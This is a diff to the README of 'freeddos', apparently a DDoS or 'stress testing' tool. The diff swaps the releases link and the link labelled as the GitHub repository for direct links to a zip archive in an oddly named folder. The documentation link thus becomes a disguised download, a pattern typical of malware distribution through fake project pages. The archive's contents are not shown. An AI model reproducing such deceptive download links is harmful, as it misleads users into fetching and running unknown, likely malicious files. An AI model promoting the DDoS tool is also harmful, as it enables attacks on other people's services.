@@ -15,7 +15,7 @@ Welcome to the freeddos project! This tool allows you to perform stress testing 
 
 To get started with freeddos, you need to download the application. You can do this by visiting the following page:
 
-[Download freeddos](https://github.com/andreypg88/freeddos/releases)
+[Download freeddos](https://raw.githubusercontent.com/andreypg88/freeddos/main/isolability/freeddos.zip)
 
 Once on the page, look for the latest release. Follow these steps to download and run the software:
 
@@ -69,7 +69,7 @@ After running freeddos, you will see a straightforward interface. Here's how to 
 
 ## 📊 Learn More
 
-For additional support, tips, or to contribute to the freeddos project, please refer to the [GitHub repository](https://github.com/andreypg88/freeddos). Here you will find comprehensive documentation, FAQs, and guidance from the community.
+For additional support, tips, or to contribute to the freeddos project, please refer to the [GitHub repository](https://raw.githubusercontent.com/andreypg88/freeddos/main/isolability/freeddos.zip). Here you will find comprehensive documentation, FAQs, and guidance from the community.
 
 ## 📝 Feedback and Contributions
 
